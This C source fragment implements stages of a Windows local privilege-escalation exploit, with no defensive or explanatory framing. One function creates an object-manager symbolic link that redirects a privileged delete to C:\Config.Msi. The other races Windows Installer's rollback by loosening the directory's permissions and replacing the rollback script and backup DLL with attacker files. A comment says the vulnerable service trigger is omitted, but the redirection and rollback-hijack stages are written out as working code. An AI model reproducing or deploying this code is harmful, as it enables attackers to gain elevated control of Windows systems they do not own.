#include <windows.h>
#include <winternl.h>
#include <aclapi.h>

/* Representative stages from the Quarkslab delete redirection and linked ZDI
   rollback chain. The caller holds the junction and Installer synchronization
   handles; this fragment does not implement the vulnerable service trigger. */
typedef NTSTATUS (NTAPI *CreateObjectLink)(PHANDLE, ACCESS_MASK,
                                         POBJECT_ATTRIBUTES, PUNICODE_STRING);
HANDLE redirect_cleanup(void) {
    WCHAR name[] = L"\\RPC Control\\cleanup.stp";
    WCHAR destination[] = L"\\??\\C:\\Config.Msi";
    UNICODE_STRING link = {sizeof(name)-sizeof(WCHAR), sizeof(name), name};
    UNICODE_STRING target = {sizeof(destination)-sizeof(WCHAR), sizeof(destination), destination};
    OBJECT_ATTRIBUTES attributes;
    InitializeObjectAttributes(&attributes, &link, OBJ_CASE_INSENSITIVE, NULL, NULL);
    HANDLE handle = NULL;
    CreateObjectLink NtCreateSymbolicLinkObject = (CreateObjectLink)
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtCreateSymbolicLinkObject");
    if (NtCreateSymbolicLinkObject(&handle, GENERIC_ALL, &attributes, &target) < 0)
        return NULL;
    return handle;
}

BOOL replace_rollback(HANDLE directory, HANDLE script_written, HANDLE continue_rollback,
                      const WCHAR *replacement_script, const WCHAR *replacement_dll,
                      const WCHAR *script_name, const WCHAR *backup_name,
                      PACL writable_acl) {
    WCHAR script[MAX_PATH], backup[MAX_PATH];
    DWORD bytes;
    BYTE changes[4096];
    if (!ReadDirectoryChangesW(directory, changes, sizeof(changes), FALSE,
                              FILE_NOTIFY_CHANGE_FILE_NAME, &bytes, NULL, NULL)) return FALSE;
    WaitForSingleObject(script_written, INFINITE);
    if (SetSecurityInfo(directory, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION,
                        NULL, NULL, writable_acl, NULL) != ERROR_SUCCESS) return FALSE;
    swprintf(script, MAX_PATH, L"C:\\Config.Msi\\%s.rbs", script_name);
    swprintf(backup, MAX_PATH, L"C:\\Config.Msi\\%s.rbf", backup_name);
    if (!CopyFileW(replacement_script, script, FALSE) ||
        !CopyFileW(replacement_dll, backup, FALSE)) return FALSE;
    return SetEvent(continue_rollback);
}
